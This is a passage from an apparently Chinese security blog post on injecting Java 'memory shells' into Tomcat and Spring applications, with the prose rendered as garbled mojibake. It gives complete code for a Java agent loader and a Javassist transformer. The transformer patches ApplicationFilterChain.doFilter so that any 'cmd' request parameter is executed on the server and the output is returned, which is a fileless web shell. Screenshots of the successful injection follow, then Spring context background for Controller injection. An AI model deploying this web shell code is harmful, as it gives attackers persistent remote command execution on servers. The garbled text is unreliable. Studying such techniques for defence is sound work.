class_">Class</span>[]&#123;java.lang.String.class&#125;);</span><br><span class="line">                    java.lang.<span class="type">Object</span> <span class="variable">vm</span> <span class="operator">=</span> attach.invoke(o,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;id&#125;);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">loadAgent</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;loadAgent&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;java.lang.String.class&#125;);</span><br><span class="line">                    java.lang.<span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/home/rainb0w/codes/java_projects/agent/out/artifacts/agent_jar/agent.jar&quot;</span>;</span><br><span class="line">                    loadAgent.invoke(vm,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;path&#125;);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">detach</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;detach&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                    detach.invoke(vm,<span class="literal">null</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†ä»¥ä¸‹é¡¹ç›®æ‰“æˆjaråŒ…ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> &#123;</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">TestTransformer</span>(), <span class="literal">true</span>);</span><br><span class="line">        Class[] classes = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class clas:classes)&#123;</span><br><span class="line">            <span class="keyword">if</span> (clas.getName().equals(ClassName))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="comment">// å¯¹ç±»è¿›è¡Œé‡æ–°å®šä¹‰</span></span><br><span class="line">                    inst.retransformClasses(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;clas&#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ClassFileTransformerçš„å®ç°ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        className = className.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (className.equals(ClassName))&#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">c</span> <span class="operator">=</span> pool.getCtClass(className);</span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> <span class="string">&quot;java.lang.String cmd = request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;if (cmd != null)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    try &#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        String line;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        StringBuilder sb = new StringBuilder(\&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        while ((line=reader.readLine()) != null)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;            sb.append(line).append(\&quot;\\n\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getWriter().write(sb.toString());\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getWriter().flush();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getWriter().close();\n&quot;</span>+</span><br><span class="line">                        <span class="string">&quot;    &#125; catch (Exception e)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        e.printStackTrace();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">                m.insertBefore(a);</span><br><span class="line">                <span class="type">byte</span>[] bytes = c.toBytecode();</span><br><span class="line">                <span class="comment">// å°† c ä» classpool ä¸­åˆ é™¤ä»¥é‡Šæ”¾å†…å­˜</span></span><br><span class="line">                c.detach();</span><br><span class="line">                <span class="keyword">return</span> bytes;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ç”Ÿæˆçš„payloadæ‰“ï¼Œä»¥ä¸‹æ˜¯æ³¨å…¥ç»“æœï¼š</p><p><a href="https://pic.imgdb.cn/item/64d2702a1ddac507cc0afc5c.jpg" title="image-20230804132524409" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d2702a1ddac507cc0afc5c.jpg" alt="image-20230804132524409"></a></p><p><a href="https://pic.imgdb.cn/item/64d270381ddac507cc0b22d0.jpg" title="image-20230804132558767" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270381ddac507cc0b22d0.jpg" alt="image-20230804132558767"></a></p><p>å¯ä»¥çœ‹åˆ°ï¼Œä¸Šé¢æåˆ°çš„è¿™ç§æ³¨å…¥Java Agentå†…å­˜é©¬çš„æ–¹æ³•ä»ç„¶éœ€è¦ä¸Šä¼ æ–‡ä»¶ã€‚ä¸è¿‡ï¼Œåœ¨rebeyondå¸ˆå‚…çš„è¿™ç¯‡æ–‡ç« <a href="https://xz.aliyun.com/t/11640">https://xz.aliyun.com/t/11640</a>ä»‹ç»äº†é€šè¿‡Java AgentNoFileçš„æ–¹å¼æ¤å…¥å†…å­˜é©¬ï¼Œæ•´ä¸ªè¿‡ç¨‹ä¸­ä¸ä¼šæœ‰æ–‡ä»¶åœ¨ç£ç›˜ä¸Šè½åœ°ï¼Œè€Œä¸”ä¸ä¼šåœ¨JVMä¸­æ–°å¢ç±»ï¼Œç”šè‡³è¿æ–¹æ³•ä¹Ÿä¸ä¼šå¢åŠ ã€‚è†œä¸€æ³¢ï¼</p><h3 id="SpringMVC-Controller-å†…å­˜é©¬æ³¨å…¥"><a href="#SpringMVC-Controller-å†…å­˜é©¬æ³¨å…¥" class="headerlink" title="SpringMVC Controller å†…å­˜é©¬æ³¨å…¥"></a>SpringMVC Controller å†…å­˜é©¬æ³¨å…¥</h3><h4 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h4><h5 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h5><p>Springå®¹å™¨å°±æ˜¯ApplicationContextï¼Œå®ƒæ˜¯ä¸€ä¸ªæ¥å£ï¼Œæœ‰å¾ˆå¤šå®ç°ç±»ã€‚è·å¾—äº†ApplicationContextçš„å®ä¾‹ï¼Œå°±è·å¾—äº†IoCå®¹å™¨çš„å¼•ç”¨ã€‚ä»ApplicationContextä¸­å¯ä»¥æ ¹æ®Beançš„IDè·å–Beanã€‚</p><p>Springè¿˜æä¾›å¦ä¸€ç§IoCå®¹å™¨å«BeanFactoryï¼Œä½¿ç”¨æ–¹å¼å’ŒApplicationContextç±»ä¼¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BeanFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XmlBeanFactory</span>(<span class="keyword">new</span> <span class="title class_">ClassPathResource</span>(<span class="string">&quot;application.xml&quot;</span>));</span><br><span class="line"><span class="type">MailService</span> <span class="variable">mailService</span> <span class="operator">=</span> factory.getBean(MailService.class);</span><br></pre></td></tr></table></figure><p>BeanFactoryå’ŒApplicationContextçš„åŒºåˆ«åœ¨äº: BeanFactoryçš„å®ç°æ˜¯æŒ‰éœ€åˆ›å»ºï¼Œå³ç¬¬ä¸€æ¬¡è·å–Beanæ—¶æ‰åˆ›å»ºè¿™ä¸ªBeanï¼Œè€ŒApplicationContextä¼šä¸€æ¬¡æ€§åˆ›å»ºæ‰€æœ‰çš„Beanã€‚å®é™…ä¸ŠApplicationContextæ¥å£æ˜¯ä»BeanFactoryæ¥å£ç»§æ‰¿è€Œæ¥çš„ã€‚BeanFactory æ¥å£æ˜¯Spring IoCå®¹å™¨çš„å®é™…ä»£è¡¨è€…ã€‚</p><h5 id="ContextLoaderListenerä¸DispatcherServlet"><a href="#ContextLoaderListenerä¸DispatcherServlet" class="headerlink" title="ContextLoaderListenerä¸DispatcherServlet"></a>ContextLoaderListenerä¸DispatcherServlet</h5><p>ä¸€ä¸ªå…¸å‹Spring åº”ç”¨çš„web.xml é…ç½®ç¤ºä¾‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;web-app xmlns:xsi=<span class="string">&quot;&lt;http://www.w3.org/2001/XMLSchema-instance&gt;&quot;</span></span><br><span class="line">         xmlns=<span class="string">&quot;&lt;http://java.sun.com/xml/ns/javaee&gt;&quot;</span></span><br><span class="line">         xsi:schemaLocation=<span class="string">&quot;&lt;http://java.sun.com/xml/ns/javaee&gt; &lt;http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&gt;&quot;</span></span><br><span class="line">         version=<span class="string">&quot;2.5&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;display-name&gt;HelloSpringMVC&lt;/display-name&gt;</span><br><span class="line">    &lt;listener&gt;</span><br><span class="line">        &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt;</span><br><span class="line">    &lt;/listener&gt;</span><br><span class="line">    &lt;context-param&gt;</span><br><span class="line">        &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;/WEB-INF/applicationContext.xml&lt;/param-value&gt;</span><br><span class="line">    &lt;/context-param&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;</span><br><span class="line">        &lt;init-param&gt;</span><br><span class="line">            &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span><br><span class="line">            &lt;param-value&gt;/WEB-INF/dispatcherServlet-servlet.xml&lt;/param-value&gt;</span><br><span class="line">        &lt;/init-param&gt;</span><br><span class="line">        &lt;load-on-startup&gt;<span class="number">1</span>&lt;/load-on-startup&gt;</span><br><span class="line">    &lt;/servlet&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure><ul><li><p>Spring åº”ç”¨ä¸­å¯ä»¥åŒæ—¶æœ‰å¤šä¸ª Contextï¼Œå…¶ä¸­åªæœ‰ä¸€ä¸ª Root Contextï¼Œå…¶ä½™éƒ½æ˜¯Child Contextã€‚</p></li><li><p>æ‰€æœ‰Child Contextéƒ½å¯ä»¥è®¿é—®åœ¨Root Contextä¸­å®šä¹‰çš„beanï¼Œä½†æ˜¯Root Contextæ— æ³•è®¿é—®Child Contextä¸­å®šä¹‰çš„ beanã€‚</p></li><li><p>æ‰€æœ‰çš„Contextåœ¨åˆ›å»ºåï¼Œä¼šä½œä¸ºä¸€ä¸ªå±æ€§è¢«æ·»åŠ åˆ°äº†ServletContextä¸­ã€‚</p></li></ul><p><strong>ContextLoaderListener</strong> ä¸»è¦è¢«ç”¨æ¥åˆå§‹åŒ–å…¨å±€å”¯ä¸€çš„Root Contextï¼Œå³Root WebApplicationContextã€‚è¿™ä¸ªRoot WebApplicationContextä¼šå’Œå…¶ä»–Child Contextå®ä¾‹å…±äº«å®ƒçš„IoCå®¹å™¨ï¼Œä¾›å…¶ä»–Child Contextè·å–å¹¶ä½¿ç”¨å®¹å™¨ä¸­çš„beanã€‚</p><p>ContextLoaderListeneræœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªç›‘å¬å™¨ã€‚Spring å®ç°äº† Tomcat æä¾›çš„ ServletContextListener æ¥å£ï¼Œå†™äº†ä¸€ä¸ªç›‘å¬å™¨æ¥ç›‘å¬é¡¹ç›®å¯åŠ¨ï¼Œä¸€æ—¦é¡¹ç›®å¯åŠ¨ï¼Œä¼šè§¦å‘ ContextLoaderListener ä¸­çš„ç‰¹å®šæ–¹æ³• <strong>contextInitialized</strong></p><p>ä¹Ÿå°±æ˜¯è¯´ Tomcat çš„ ServletContext åˆ›å»ºæ—¶ï¼Œä¼šè°ƒç”¨ ContextLoaderListener çš„ contextInitialized()ï¼Œè¿™ä¸ªæ–¹æ³•å†…éƒ¨çš„ initWebApplicationContext()å°±æ˜¯ç”¨æ¥åˆå§‹åŒ– Spring çš„ IOC å®¹å™¨çš„ã€‚</p><ol><li><p>ServletContext å¯¹è±¡æ˜¯ Tomcat çš„ï¼›</p></li><li><p>ServletContextListener æ˜¯ Tomcat æä¾›çš„æ¥å£ï¼›</p></li><li><p>ContextLoaderListener æ˜¯ Spring å†™çš„ï¼Œå®ç°äº† ServletContextListenerï¼›</p></li><li><p>Spring è‡ªå·±å†™çš„ç›‘å¬å™¨ï¼Œç”¨æ¥åˆ›å»º Spring IOC å®¹å™¨ï¼›</p></li></ol><p>å…¶ç›¸å…³é…ç½®å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;context-param&gt;</span><br><span class="line">    &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span><br><span class="line">    &lt;param-value&gt;/WEB-INF/applicationContext.xml&lt;/param-value&gt;</span><br><span class="line">&lt;/context-param&gt;</span><br><span class="line"></span><br><span class="line">&lt;listener&gt;</span><br><span class="line">    &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt;</span><br><span class="line">&lt;/listener&gt;</span><br></pre></td></tr></table></figure><p><strong>DispatcherServlet</strong> ä»æœ¬è´¨ä¸Šæ¥è®²æ˜¯ä¸€ä¸ª Servletï¼ˆå®ƒç»§æ‰¿è‡ªHttpServletï¼‰ã€‚å®ƒçš„ä¸»è¦ä½œç”¨æ˜¯å¤„ç†ä¼ å…¥çš„webè¯·æ±‚ï¼Œæ ¹æ®é…ç½®çš„URL patternï¼Œå°†è¯·æ±‚åˆ†å‘ç»™æ­£ç¡®çš„Controllerå’ŒViewã€‚DispatcherServletåˆå§‹åŒ–å®Œæˆåï¼Œä¼šåˆ›å»ºä¸€ä¸ªæ™®é€šçš„Child Contextå®ä¾‹ã€‚</p><p><strong>ç»¼ä¸Šï¼š</strong> æ¯ä¸ªå…·ä½“çš„DispatcherServletåˆ›å»ºçš„æ˜¯ä¸€ä¸ªChild Contextï¼Œä»£è¡¨ä¸€ä¸ªç‹¬ç«‹çš„IoCå®¹å™¨ï¼›è€Œ ContextLoaderListeneræ‰€åˆ›å»ºçš„æ˜¯ä¸€ä¸ªRoot Contextï¼Œä»£è¡¨å…¨å±€å”¯ä¸€çš„ä¸€ä¸ªå…¬å…± IoC å®¹å™¨ã€‚</p><p>å¦‚æœè¦è®¿é—®å’Œæ“ä½œbeanï¼Œä¸€èˆ¬è¦è·å¾—å½“å‰ä»£ç æ‰§è¡Œç¯å¢ƒçš„IoC å®¹å™¨ï¼ˆChild Contextï¼‰ä»£è¡¨è€…ApplicationContextã€‚</p><p>æœ‰ä»¥ä¸‹å‡ ç§åŠæ³•è·å–ä»£ç è¿è¡Œæ—¶çš„ä¸Šä¸‹æ–‡ç¯å¢ƒï¼š</p><p><strong>ç¬¬ä¸€ç§ï¼š</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> ContextLoaderListener.getCurrentWebApplicationContext();</span><br></pre></td></tr></table></figure><p>getCurrentWebApplicationContext è·å¾—çš„æ˜¯ Root WebApplicationContextã€‚ä½†æ˜¯è¯·æ³¨æ„ï¼Œæ‰“å…¥å†…å­˜é©¬ä½¿ç”¨è¿™ç§æ–¹å¼è·å–ä¸Šä¸‹æ–‡ç¯å¢ƒæ—¶æœ‰ä¸€äº›é™åˆ¶ï¼Œä¸€ç§æ˜¯ç›®æ ‡ä¸èƒ½æ˜¯SpringBootã€‚æˆ‘ä»¬åˆšåˆšçœ‹åˆ°ContextLoaderListener å¦‚æœè¦å®ç°å®ƒåº”æœ‰çš„åŠŸèƒ½ï¼Œæ˜¯éœ€è¦åœ¨ web.xml ä¸­é…ç½®çš„ã€‚è€Œ SpringBoot ä¸­æ— è®ºæ˜¯ä»¥ main æ–¹æ³•è¿˜æ˜¯ spring-boot:run çš„æ–¹å¼æ‰§è¡Œéƒ½ä¸è·‘ SpringBootServletInitializer ä¸­çš„ onStartupï¼Œ å¯¼è‡´ ContextLoaderListener æ²¡æœ‰æ‰§è¡Œã€‚å› æ­¤é€šè¿‡è¿™ç§åŠæ³•è·å–åˆ°çš„contextä¸ºnullï¼š</p><p><a href="https://pic.imgdb.cn/item/64d270451ddac507cc0b42ad.jpg" title="image-20230808005326916" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270451ddac507cc0b42ad.jpg" alt="image-20230808005326916"></a></p><p>è¿˜æœ‰ä¸€ç›´é™åˆ¶å°±æ˜¯æœ‰äº›Spring åº”ç”¨é€»è¾‘æ¯”è¾ƒç®€å•çš„æƒ…å†µä¸‹ï¼Œå¯èƒ½æ²¡æœ‰é…ç½® ContextLoaderListener ã€ä¹Ÿæ²¡æœ‰ç±»ä¼¼ applicationContext.xml çš„å…¨å±€é…ç½®æ–‡ä»¶ï¼Œåªæœ‰ç®€å•çš„ servlet é…ç½®æ–‡ä»¶ï¼Œè¿™æ—¶å€™é€šè¿‡è¿™ç§æ–¹æ³•ä¹Ÿæ˜¯è·å–ä¸åˆ°Root WebApplicationContextçš„ã€‚</p><p><strong>ç¬¬äºŒç§ï¼š</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨è¿™ç§æ–¹æ³•å¯ä»¥è·å¾—ä¸€ä¸ªåå« dispatcherServlet-servlet çš„ Child WebApplicationContextã€‚</p><h4 id="æµç¨‹åˆ†æ-4"><a href="#æµç¨‹åˆ†æ-4" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h4><p>å…ˆç¼–å†™ä¸€ä¸ªç®€å•çš„Controllerï¼Œä¹‹ååœ¨Controllerç±»ä¸‹æ–­ï¼Œç„¶åè®¿é—®é…ç½®çš„è·¯ç”±ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d270581ddac507cc0b7287.jpg" title="image-20230807221029340" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270581ddac507cc0b7287.jpg" alt="image-20230807221029340"></a></p><p>DispatcherServletçš„ä¸»è¦ä½œç”¨æ˜¯å¤„ç†ä¼ å…¥çš„webè¯·æ±‚ï¼Œæ ¹æ®é…ç½®çš„URL patternï¼Œå°†è¯·æ±‚åˆ†å‘ç»™æ­£ç¡®çš„Controllerå’ŒViewã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„Webè¯·æ±‚ç»è¿‡DispatcherServletçš„doDispatchæ–¹æ³•å¤„ç†åè¢«è½¬å‘äº†è¿‡æ¥ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d270631ddac507cc0b8bf1.jpg" title="image-20230807221156182" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270631ddac507cc0b8bf1.jpg" alt="image-20230807221156182"></a></p><p>å¯¹è°ƒç”¨æ ˆå‘ä¸Šå›æº¯çœ‹çœ‹DispatcherServletæ˜¯æ€ä¹ˆåšçš„åˆ†å‘ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d2706e1ddac507cc0ba5f5.jpg" title="image-20230807221313308" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d2706e1ddac507cc0ba5f5.jpg" alt="image-20230807221313308"></a></p><p>é€šè¿‡è°ƒç”¨HandlerAdapterç±»çš„handleæ–¹æ³•å¯¹requestå’Œresponseå¯¹è±¡è¿›è¡Œå¤„ç†ï¼Œå¹¶ä¸”é€šè¿‡è°ƒç”¨org.springframework.web.servlet.HandlerExecutionChain#getHandleræ–¹æ³•è·å–äº†mappedHandlerçš„handlerå­—æ®µã€‚æˆ‘ä»¬çœ‹ä¸€ä¸‹mappedHandleræ˜¯æ€ä¹ˆæ¥çš„ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d270771ddac507cc0bbe88.jpg" title="image-20230807223847138" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270771ddac507cc0bbe88.jpg" alt="image-20230807223847138"></a></p><p>è·Ÿè¿›<code>org.springframework.web.servlet.DispatcherServlet#getHandler</code>ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d270891ddac507cc0be788.jpg" title="image-20230807223913403" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270891ddac507cc0be788.jpg" alt="image-20230807223913403"></a></p><p>å¯ä»¥å‘ç°mappedHandleræ˜¯å¯¹handlerMappingséå†åè°ƒç”¨getHandler()å¾—åˆ°çš„ï¼Œæ‰“ä¸‹æ–­ç‚¹ï¼Œè·Ÿè¿›åˆ°äº†<code>org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandler</code>ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d270991ddac507cc0c1114.jpg" title="image-20230807224114663" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270991ddac507cc0c1114.jpg" alt="image-20230807224114663"></a></p><p>åœ¨æ­¤å¤„åˆè°ƒç”¨äº†ç›¸åº”HandlerMappingå®ç°ç±»çš„getHandlerInternal()æ–¹æ³•ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d270a61ddac507cc0c3088.jpg" title="image-20230807224322836" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270a61ddac507cc0c3088.jpg" alt="image-20230807224322836"></a></p><p>è·Ÿè¿›åï¼Œå‘ç°åˆè°ƒç”¨äº†çˆ¶ç±»çš„getHandlerInternal()æ–¹æ³•ï¼Œå³`org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#getHandlerInternal`ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d270b01ddac507cc0c4718.jpg" title="image-20230807224622982" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270b01ddac507cc0c4718.jpg" alt="image-20230807224622982"></a></p><p>é¦–å…ˆè·å–äº†æˆ‘ä»¬è®¾ç½®çš„è·¯ç”±ï¼Œä¹‹åå¯¹mappingRegistryè¿›è¡Œä¸Šé”ï¼Œæœ€åè§£é”ã€‚åœ¨mappingRegistryä¸­å­˜å‚¨äº†è·¯ç”±ä¿¡æ¯ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d270bf1ddac507cc0c6da6.jpg" title="image-20230807224651916" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270bf1ddac507cc0c6da6.jpg" alt="image-20230807224651916"></a></p><p>ä¹‹åè°ƒç”¨äº†org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#lookupHandlerMethodï¼Œæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/64d270c81ddac507cc0c837d.jpg" title="image-20230807225613423" class="gallery-item"><img src="https://pic.imgdb.cn/item/64d270c81ddac507cc0c837d.jpg" 